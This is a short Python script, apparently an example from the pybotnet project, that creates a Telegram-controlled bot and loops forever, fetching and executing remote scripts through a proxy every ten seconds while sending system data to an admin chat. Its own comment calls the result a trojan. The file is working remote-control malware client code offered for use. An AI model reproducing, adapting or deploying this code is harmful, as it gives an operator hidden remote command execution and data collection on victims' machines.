from pybotnet import pybotnet
import time


# ! rename configs.py.sample to configs.py
# ! and edit configs.py data
from configs import TELEGRAM_TOKEN, ADMIN_CHAT_ID
# is_shell has already been removed since version 1.0.0 , please consider updating if your trojans made by pybotnet still have this.
# * show_log: just for debugging
# * send_system_data: send system short info in bot messages

bot = pybotnet.PyBotNet(TELEGRAM_TOKEN, ADMIN_CHAT_ID,
                        show_log=True, send_system_data=True)

delay = 10

while True:
    print('*-*'*15)
    bot.get_and_execute_scripts_by_third_party_proxy()
    time.sleep(delay)
